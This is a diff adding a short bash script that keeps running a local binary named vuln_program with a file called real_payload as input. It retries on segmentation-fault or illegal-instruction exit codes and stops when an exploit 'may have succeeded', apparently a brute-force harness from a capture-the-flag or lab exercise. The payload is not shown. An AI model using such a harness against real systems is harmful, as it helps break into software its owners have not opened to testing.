@@ -1,0 +1,25 @@
+#!/bin/bash
+  
+SECONDS=0
+value=0
+
+while true; do
+  value=$((value + 1))
+  duration=$SECONDS
+  min=$((duration / 60))
+  sec=$((duration % 60))
+  echo "$min minutes and $sec seconds elapsed."
+  echo "The program has been running $value times so far."
+
+  # Run the program and capture the exit status
+  ./vuln_program < real_payload
+  exit_code=$?
+
+  # Check if the exit code corresponds to segmentation fault (139) or illegal instruction (132)
+  if [ $exit_code -eq 139 ] || [ $exit_code -eq 132 ]; then
+    echo "Segmentation fault or Illegal instruction detected. Retrying..."
+  else
+    echo "Exploit may have succeeded! Exiting..."
+    break
+  fi
+done
